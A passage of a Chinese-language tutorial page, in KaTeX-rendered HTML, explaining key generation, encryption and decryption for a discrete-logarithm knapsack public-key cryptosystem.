style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></p></li><li><p>由于我们离散对数的问题，所以建议先生成公钥，然后利用公钥反推私钥</p></li></ul><p><strong>公钥的生成</strong>：</p><ul><li>利用私钥给中的<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>a</mi><mi>n</mi></msub></mrow><annotation encoding="application/x-tex">a_n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.58056em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">n</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>、g、p，按照如下方式生成公钥<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>b</mi><mi>n</mi></msub></mrow><annotation encoding="application/x-tex">b_n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.84444em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">n</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></li></ul><p class="katex-block"><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><msub><mi>b</mi><mi>n</mi></msub><mo>=</mo><mi>l</mi><mi>o</mi><msub><mi>g</mi><mi>g</mi></msub><mo stretchy="false">(</mo><msub><mi>a</mi><mi>i</mi></msub><mo stretchy="false">)</mo><mtext> </mtext><mi>m</mi><mi>o</mi><mi>d</mi><mtext> </mtext><mi>p</mi></mrow><annotation encoding="application/x-tex">b_n = log_g(a_i)~mod~p</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.84444em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">n</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.036108em;vertical-align:-0.286108em;"></span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">o</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.15139200000000003em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.03588em;">g</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mspace nobreak"> </span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mspace nobreak"> </span><span class="mord mathnormal">p</span></span></span></span></span></p><p><strong>加密过程</strong>：公钥（<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>b</mi><mi>n</mi></msub></mrow><annotation encoding="application/x-tex">b_n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.84444em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">n</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>）私钥（<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>a</mi><mi>n</mi></msub></mrow><annotation encoding="application/x-tex">a_n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.58056em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">n</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>，g，p）</p><ul><li>对于给定消息v，将消息v转换成整数，最后转成整数的二进制序列<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>v</mi><mi>i</mi></msub></mrow><annotation encoding="application/x-tex">v_i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.58056em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></li><li>接下来我们就可以对消息加密，加密过程如下：</li></ul><p class="katex-block"><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi>c</mi><mo>=</mo><munderover><mo>∑</mo><mrow><mi>i</mi><mo>=</mo><mn>1</mn></mrow><mi>n</mi></munderover><msub><mi>b</mi><mi>i</mi></msub><msub><mi>v</mi><mi>i</mi></msub><mo>=</mo><munderover><mo>∑</mo><mrow><mi>i</mi><mo>=</mo><mn>1</mn></mrow><mi>n</mi></munderover><mi>l</mi><mi>o</mi><msub><mi>g</mi><mi>g</mi></msub><mo stretchy="false">(</mo><msub><mi>a</mi><mi>i</mi></msub><mo stretchy="false">)</mo><msub><mi>v</mi><mi>i</mi></msub><mtext> </mtext><mi>m</mi><mi>o</mi><mi>d</mi><mtext> </mtext><mi>p</mi><mo>=</mo><mi>l</mi><mi>o</mi><msub><mi>g</mi><mi>g</mi></msub><mo stretchy="false">(</mo><munderover><mo>∏</mo><mrow><mi>i</mi><mo>=</mo><mn>1</mn></mrow><mi>n</mi></munderover><msub><mi>a</mi><mi>i</mi></msub><msub><mi>v</mi><mi>i</mi></msub><mo stretchy="false">)</mo><mtext> </mtext><mi>m</mi><mi>o</mi><mi>d</mi><mtext> </mtext><mi>p</mi></mrow><annotation encoding="application/x-tex">c = \sum_{i=1}^nb_iv_i=\sum_{i=1}^nlog_g(a_i)v_i~mod~p=log_g(\prod_{i=1}^na_iv_i)~mod~p</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathnormal">c</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:2.929066em;vertical-align:-1.277669em;"></span><span class="mop op-limits"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.6513970000000002em;"><span style="top:-1.872331em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span><span class="mrel mtight">=</span><span class="mord mtight">1</span></span></span></span><span style="top:-3.050005em;"><span class="pstrut" style="height:3.05em;"></span><span><span class="mop op-symbol large-op">∑</span></span></span><span style="top:-4.3000050000000005em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">n</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.277669em;"><span></span></span></span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathnormal">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:2.929066em;vertical-align:-1.277669em;"></span><span class="mop op-limits"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.6513970000000002em;"><span style="top:-1.872331em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span><span class="mrel mtight">=</span><span class="mord mtight">1</span></span></span></span><span style="top:-3.050005em;"><span class="pstrut" style="height:3.05em;"></span><span><span class="mop op-symbol large-op">∑</span></span></span><span style="top:-4.3000050000000005em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">n</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.277669em;"><span></span></span></span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">o</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.15139200000000003em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.03588em;">g</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace nobreak"> </span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mspace nobreak"> </span><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:2.929066em;vertical-align:-1.277669em;"></span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">o</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.15139200000000003em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.03588em;">g</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mop op-limits"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.6513970000000002em;"><span style="top:-1.872331em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span><span class="mrel mtight">=</span><span class="mord mtight">1</span></span></span></span><span style="top:-3.050005em;"><span class="pstrut" style="height:3.05em;"></span><span><span class="mop op-symbol large-op">∏</span></span></span><span style="top:-4.3000050000000005em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">n</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.277669em;"><span></span></span></span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mspace nobreak"> </span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mspace nobreak"> </span><span class="mord mathnormal">p</span></span></span></span></span></p><p><strong>解密过程</strong>：</p><ul><li>解密过程经过如下就可以得到一个门限，如果要还原成明文二进制序列就必须满足<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>p</mi><mo>&gt;</mo><msubsup><mo>∏</mo><mrow><mi>i</mi><mo>=</mo><mn>1</mn></mrow><mi>n</mi></msubsup><msub><mi>a</mi><mi>i</mi></msub><msub><mi>v</mi><mi>i</mi></msub></mrow><annotation encoding="application/x-tex">p&gt;\prod_{i=1}^na_iv_i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7335400000000001em;vertical-align:-0.19444em;"></span><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">&gt;</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.104002em;vertical-align:-0.29971000000000003em;"></span><span class="mop"><span class="mop op-symbol small-op" style="position:relative;top:-0.0000050000000000050004em;">∏</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.804292em;"><span style="top:-2.40029em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span><span class="mrel mtight">=</span><span class="mord mtight">1</span></span></span></span><span style="top:-3.2029em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">n</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.29971000000000003em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></li></ul><p class="katex-block"><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi>m</mi><mo>=</mo><msup><mi>g</mi><mi>c</mi></msup><mo>=</mo><msup><mi>g</mi><mrow><mi>l</mi><mi>o</mi><msub><mi>g</mi><mi>g</mi></msub><mo stretchy="false">(</mo><munderover><mo>∏</mo><mrow><mi>i</mi><mo>=</mo><mn>1</mn></mrow><mi>n</mi></munderover><msub><mi>a</mi><mi>i</mi></msub><msub><mi>v</mi><mi>i</mi></msub><mo stretchy="false">)</mo></mrow></msup><mtext> </mtext><mi>m</mi><mi>o</mi><mi>d</mi><mtext> </mtext><mi>p</mi><mo>=</mo><munderover><mo>∏</mo><mrow><mi>i</mi><mo>=</mo><mn>1</mn></mrow><mi>n</mi></munderover><msub><mi>a</mi><mi>i</mi></msub><msub><mi>v</mi><mi>i</mi></msub><mtext> </mtext><mi>m</mi><mi>o</mi><mi>d</mi><mtext> </mtext><mi>p</mi></mrow><annotation encoding="application/x-tex">m = g^c=g^{log_g(\prod_{i=1}^na_iv_i)}~mod~p =\prod_{i=1}^na_iv_i~mod~p</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathnormal">m</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.9088319999999999em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7143919999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">c</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.13244em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.9379999999999998em;"><span style="top:-3.1130000000000004em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.01968em;">l</span><span class="mord mathnormal mtight">o</span><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.03588em;">g</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.16454285714285716em;"><span style="top:-2.357em;margin-left:-0.03588em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mathnormal mtight" style="margin-right:0.03588em;">g</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2818857142857143em;"><span></span></span></span></span></span></span><span class="mopen mtight">(</span><span class="mop mtight"><span class="mop op-symbol small-op mtight" style="position:relative;top:-0.0000050000000000050004em;">∏</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.7385428571428572em;"><span style="top:-2.1785614285714283em;margin-left:0em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span><span class="mrel mtight">=</span><span class="mord mtight">1</span></span></span></span><span style="top:-2.931em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mathnormal mtight">n</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.32143857142857146em;"><span></span></span></span></span></span></span><span class="mspace mtight" style="margin-right:0.19516666666666668em;"></span><span class="mord mtight"><span class="mord mathnormal mtight">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3280857142857143em;"><span style="top:-2.357em;margin-left:0em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.03588em;">v</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3280857142857143em;"><span style="top:-2.357em;margin-left:-0.03588em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span><span class="mclose mtight">)</span></span></span></span></span></span></span></span></span><span class="mspace nobreak"> </span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mspace nobreak"> </span><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:2.929066em;vertical-align:-1.277669em;"></span><span class="mop op-limits"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.6513970000000002em;"><span style="top:-1.872331em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span><span class="mrel mtight">=</span><span class="mord mtight">1</span></span></span></span><span style="top:-3.050005em;"><span class="pstrut" style="height:3.05em;"></span><span><span class="mop op-symbol large-op">∏</span></span></span><span style="top:-4.3000050000000005em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">n</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.277669em;"><span></span></span></span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace nobreak"> </span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mspace nobreak"> </span><span class="mord mathnormal">p</span></span></span></span></span></p><ul><li>由于解密方知道<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>a</mi><mi>n</mi></msub></mrow><annotation encoding="application/x-tex">a_n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.58056em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">n</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>这个序列，此时我们就可以遍历<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>a</mi><mi>n</mi></msub></mrow><annotation encoding="application/x-tex">a_n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.58056em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">n</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>。此时我们通过判断<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>a</mi><mi>n</mi></msub></mrow><annotation encoding="application/x-tex">a_n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.58056em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">n</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>中的每个元素是否能整除<strong>m</strong>，从而得到明文的二进制序列。</li></ul><h2 